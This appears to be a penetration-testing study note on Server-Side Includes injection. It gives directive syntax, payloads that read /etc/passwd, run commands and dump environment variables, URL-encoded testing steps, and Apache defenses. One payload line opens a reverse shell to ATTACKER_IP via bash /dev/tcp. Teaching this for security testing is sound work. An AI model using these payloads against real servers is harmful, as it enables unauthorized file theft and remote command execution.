---
tags: [vapt, injection, intermediate]
difficulty: intermediate
module: "10 - Injection Attacks"
topic: "10.11 SSI Injection (Server-Side Includes)"
---

# 10.11 — SSI Injection (Server-Side Includes)

## What are Server-Side Includes?

SSI (Server-Side Includes) is an old Apache/Nginx feature that processes special directives in HTML files before serving them. If user input is placed in an SSI-processed file, attackers can inject SSI directives to read files, execute commands, and more.

```
SSI DIRECTIVE SYNTAX:
  <!--#directive attribute="value" -->
  
EXAMPLES:
  <!--#echo var="DATE_LOCAL" -->      → outputs current date
  <!--#include file="/etc/passwd" --> → includes file contents!
  <!--#exec cmd="id" -->             → executes OS command!
  <!--#printenv -->                  → all environment variables!
```

---

## Identifying SSI-Enabled Files

```
SSI IS ENABLED ON:
  Files with .shtml extension (most common)
  Files with .stm extension  
  .html files if Options +Includes configured in Apache

INDICATORS:
  URL ends in .shtml
  Apache web server (most common SSI host)
  Response headers: Server: Apache
  App generates pages with .shtml extension

LESS COMMON:
  Nginx with ngx_http_ssi_module enabled
```

---

## SSI Injection Payloads

```html
<!-- PRINT SERVER VARIABLE: -->
<!--#echo var="DATE_LOCAL" -->      → current date (PoC)
<!--#echo var="DOCUMENT_URI" -->    → current URL path
<!--#echo var="REMOTE_ADDR" -->     → server IP
<!--#echo var="SERVER_SOFTWARE" --> → web server version

<!-- READ FILES: -->
<!--#include file="/etc/passwd" -->
<!--#include file="../../../etc/passwd" -->
<!--#include virtual="/etc/passwd" -->

<!-- EXECUTE COMMANDS: -->
<!--#exec cmd="id" -->
<!--#exec cmd="cat /etc/passwd" -->
<!--#exec cmd="whoami" -->
<!--#exec cmd="ls -la /var/www/html" -->

<!-- ENVIRONMENT VARIABLES: -->
<!--#printenv -->                   → ALL environment variables!

<!-- REVERSE SHELL: -->
<!--#exec cmd="bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" -->
```

---

## Testing for SSI Injection

```bash
# STEP 1: IDENTIFY SSI-ENABLED ENDPOINT:
# Look for .shtml URLs or Apache server
curl -I https://target.com/page.shtml | grep "server:"

# STEP 2: FIND REFLECTION POINT:
# Any user input that appears in a .shtml page
# Common: username, name, search term, error message

# STEP 3: INJECT TEST PAYLOAD:
?name=<!--%23echo+var="DATE_LOCAL"-->
# URL-encoded: <!--#echo var="DATE_LOCAL"-->

# If response includes the current date → SSI INJECTION!

# STEP 4: ESCALATE TO RCE:
?name=<!--%23exec+cmd="id"-->
# URL-encoded: <!--#exec cmd="id"-->

# IF exec IS DISABLED (common restriction):
# Only include and echo may work
?name=<!--%23include+file="/etc/passwd"-->
```

---

## When exec Is Disabled

```
MANY SERVERS HAVE exec DISABLED (Options -IncludesNOEXEC):
  <!--#include file="/etc/passwd" -->  → may still work!
  <!--#echo var="DATE_LOCAL" -->       → works
  <!--#exec cmd="id" -->               → ERROR: exec disabled

EVEN WITHOUT exec:
  → Still can read arbitrary files via include
  → Can leak environment variables via printenv
  → Can exfiltrate server info via echo vars

IMPACT WITHOUT exec:
  Read /etc/passwd → enumerate users
  Read web app config files → DB passwords!
  Read SSH keys → if readable
  Severity: High (even without command execution)
```

---

## SSI Variables Reference

```
<!--#echo var="VARIABLE_NAME" -->

VARIABLE               VALUE
--------               -----
DATE_LOCAL             Local date/time
DATE_GMT               GMT date/time  
DOCUMENT_NAME          Filename of current document
DOCUMENT_URI           URI of current document
LAST_MODIFIED          Last modification time
REMOTE_HOST            Hostname of client
REMOTE_ADDR            IP of client
HTTP_USER_AGENT        Browser user agent
HTTP_REFERER           Referring URL
QUERY_STRING           Query string
REQUEST_METHOD         GET/POST
SERVER_NAME            Web server hostname
SERVER_SOFTWARE        Web server version
```

---

## Defense

```
PROTECTION:
  1. Disable SSI entirely (or limit to specific directories):
     Apache: Options -Includes
     Or: Remove Options Includes from config
  
  2. If SSI is needed — disable exec:
     Apache: Options +IncludesNOEXEC
     → Allows include/echo but not exec
  
  3. Never store user input in SSI-processed files
  
  4. Encode HTML entities in user output before storing:
     < → &lt;  > → &gt;  # → &#35;  ! → &#33;
     → <!--#exec cmd="id"--> becomes &#60;&#33;--#exec...
     → Not processed as SSI directive!
  
  5. Use modern web frameworks that don't support SSI
     → SSI is an old technology; avoid on new applications
```

---

## Related Notes
- [[Module 08 - Command Injection]] — OS command execution
- [[Module 09 - SSTI]] — modern equivalent (server-side template injection)
- [[04 - SSTI in Jinja2]] — SSI vs SSTI comparison
- [[17 - SSTI in ERB]] — similar server-side code injection
